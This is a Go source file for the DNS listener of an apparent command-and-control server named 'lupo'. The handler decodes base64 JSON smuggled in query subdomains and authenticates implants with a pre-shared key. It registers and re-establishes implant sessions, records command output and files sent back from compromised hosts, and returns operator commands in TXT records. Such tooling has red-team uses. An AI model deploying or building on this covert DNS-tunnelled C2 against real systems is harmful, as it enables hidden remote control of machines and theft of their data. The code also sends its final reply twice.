package server

import (
	"fmt"
	"strings"
	"encoding/base64"
	"log"
	"os"
	"text/tabwriter"
	"strconv"
	"encoding/json"
	"errors"

	"github.com/InjectionSoftwareandSecurityLLC/lupo/lupo-server/core"
	"github.com/miekg/dns"
)


func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {

	var dnsParams core.DNSData
	remoteAddr := w.RemoteAddr().String()
	dnsParams.Register = false

	var additionalFunctions map[string]interface{}

	fmt.Println("\n📥 Received from", remoteAddr)

	tw := tabwriter.NewWriter(os.Stdout, 0, 0, 2, ' ', tabwriter.Debug)
	fmt.Fprintln(tw, "Question Name\tType\tClass")
	for _, q := range r.Question {
		fmt.Fprintf(tw, "%s\t%s\t%s\n", q.Name, dns.TypeToString[q.Qtype], dns.ClassToString[q.Qclass])
	}
	tw.Flush()

	msg := new(dns.Msg)
	msg.SetReply(r)


	var subdomainDecoded string

	var name string

	for _, q := range r.Question {
		if q.Qtype == dns.TypeTXT {
			subdomainRaw := extractSubdomainPrefix(q.Name)
			subdomainDecoded = decodeBase64(subdomainRaw)
			//clientPayload := extractClientPayload(r)

			name = q.Name
			/*
			responseTxt := fmt.Sprintf("Decoded [%s]: %s", subdomainDecoded, clientPayload)

			rr := &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   q.Name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    60,
				},
				Txt: []string{responseTxt},
			}
			msg.Answer = append(msg.Answer, rr)
			*/
		}
	}

	err := json.Unmarshal([]byte(subdomainDecoded), &dnsParams)


	if err != nil {
		core.LogData("error: Problem occurred while parsing input from a DNS based implant")
		core.ErrorColorBold.Println("There was an error with parsing input from a DNS based implant, check the error below:")
		fmt.Println(err)
	}

	if dnsParams.PSK == "" {
		errorString := "DNS Request did not provide PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if dnsParams.ImplantArch == "" {
		dnsParams.ImplantArch = "Unknown"
	}

	if dnsParams.AdditionalFunctions != "" {
		json.Unmarshal([]byte(dnsParams.AdditionalFunctions), &additionalFunctions)
	} else {
		additionalFunctions = nil
	}

	if dnsParams.Username == "" {
		dnsParams.Username = "server"
	}

	if dnsParams.PSK == PSK {

		if dnsParams.Register == true {

			implant := core.RegisterImplant(dnsParams.ImplantArch, dnsParams.Update, additionalFunctions, "")

			core.RegisterSession(core.SessionID, "DNS", implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			jsonResp, err := json.Marshal(response)

			if err != nil {
				errorString := "Error converting DNS response to JSON"
				core.LogData(errorString)
				core.ErrorColorBold.Println(errorString)
			}

			fmt.Println(string((jsonResp)))

			rr := &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    60,
				},
				Txt: []string{string(jsonResp)},
			}
			msg.Answer = append(msg.Answer, rr)

			w.WriteMsg(msg)

			core.BroadcastSession(strconv.Itoa(newSession))

			return

		}
	} else {
		errorString := "DNS Request Invalid PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}


	sVal, ok := core.Sessions.Load(dnsParams.SessionID)

	if !ok {
		// Session missing
		if core.PersistenceMode {
			reconnectString := "Old implant with UUID: " + dnsParams.UUID.String() + " connected, attempting to reestablish session..."
			core.LogData(reconnectString)
			core.WarningColorBold.Println(reconnectString)

			implant := core.RegisterImplant(dnsParams.ImplantArch, dnsParams.Update, additionalFunctions, dnsParams.UUID.String())

			core.RegisterSession(core.SessionID, "DNS", implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			jsonResp, err := json.Marshal(response)

			if err != nil {
				errorString := "Error converting DNS response to JSON"
				core.LogData(errorString)
				core.ErrorColorBold.Println(errorString)
			}

			rr := &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    60,
				},
				Txt: []string{string(jsonResp)},
			}
			msg.Answer = append(msg.Answer, rr)

			w.WriteMsg(msg)

			core.BroadcastSession(strconv.Itoa(newSession))

			return
		} else {
			errorString := "DNS Request Invalid UUID, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	}

	session := sVal.(core.Session)


	if session.Implant.ID != dnsParams.UUID || dnsParams.UUID == core.ZeroedUUID {
		if core.PersistenceMode {
			reconnectString := "Old implant with UUID: " + dnsParams.UUID.String() + " connected, attempting to reestablish session..."
			core.LogData(reconnectString)
			core.WarningColorBold.Println(reconnectString)

			implant := core.RegisterImplant(dnsParams.ImplantArch, dnsParams.Update, additionalFunctions, dnsParams.UUID.String())

			core.RegisterSession(core.SessionID, "DNS", implant, remoteAddr, 0, "", "", "", "")

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			jsonResp, err := json.Marshal(response)

			if err != nil {
				errorString := "Error converting DNS response to JSON"
				core.LogData(errorString)
				core.ErrorColorBold.Println(errorString)
			}

			rr := &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    60,
				},
				Txt: []string{string(jsonResp)},
			}
			msg.Answer = append(msg.Answer, rr)

			w.WriteMsg(msg)

			core.BroadcastSession(strconv.Itoa(newSession))

			return
		} else {
			errorString := "DNS Request Invalid UUID, request ignored"
			core.LogData(errorString)
			returnErr := errors.New(errorString)
			ErrorHandler(returnErr)
			return
		}
	}

	if dnsParams.Data != "" {
		core.LogData("Session " + strconv.Itoa(dnsParams.SessionID) + " returned:\n" + dnsParams.Data)
		if dnsParams.Username == "server" {
			fmt.Println("\nSession " + strconv.Itoa(dnsParams.SessionID) + " returned:\n" + dnsParams.Data)
		} else {
			currentWolf := core.Wolves[dnsParams.Username]
			jsonData := `{"data":"` + dnsParams.Data + `"}`
			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
		}
	}

	if dnsParams.FileName != "" {
		core.LogData("Session " + strconv.Itoa(dnsParams.SessionID) + " returned the file: " + dnsParams.FileName)

		if dnsParams.File == "" {
			core.LogData("Session " + strconv.Itoa(dnsParams.SessionID) + " file contents was empty, no file written for: " + dnsParams.FileName)
			fmt.Println("\nSession " + strconv.Itoa(dnsParams.SessionID) + " file contents was empty, no file written for: " + dnsParams.FileName)
		} else {
			if dnsParams.Username == "server" {
				core.DownloadFile(dnsParams.FileName, dnsParams.File)
			} else {
				currentWolf := core.Wolves[dnsParams.Username]
				jsonData := `{"filename":"` + dnsParams.FileName + `"` + `,"file":"` + dnsParams.File + `"}`
				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
			}
		}
	}


	var cmd string
	var user string

	if session.Implant.Commands != nil {
		cmd = session.Implant.Commands[0].Command
		user = session.Implant.Commands[0].Operator
	}

	response := map[string]interface{}{
		"user": user,
		"cmd":  cmd,
	}

	jsonResp, err := json.Marshal(response)

	if err != nil {
		errorString := "Error converting DNS cmd to JSON"
		core.LogData(errorString)
		core.ErrorColorBold.Println(errorString)
	}

	core.UpdateImplant(dnsParams.SessionID, dnsParams.Update, dnsParams.ImplantArch, additionalFunctions)
	core.SessionCheckIn(dnsParams.SessionID)

	rr := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    60,
		},
		Txt: []string{string(jsonResp)},
	}
	msg.Answer = append(msg.Answer, rr)

	w.WriteMsg(msg)

	w.WriteMsg(msg)
}

func extractSubdomainPrefix(name string) string {
	parts := strings.Split(name, ".")
	if len(parts) > 0 {
		return parts[0] // First label (subdomain)
	}
	return "unknown"
}

func decodeBase64(input string) string {
	decoded, err := base64.RawURLEncoding.DecodeString(input)
	if err != nil {
		log.Printf("⚠️ Failed to decode base64 subdomain '%s': %v", input, err)
		return "(invalid base64)"
	}
	return string(decoded)
}

func extractClientPayload(r *dns.Msg) string {
	for _, extra := range r.Extra {
		if txt, ok := extra.(*dns.TXT); ok {
			return strings.Join(txt.Txt, " ")
		}
	}
	return "(no payload)"
}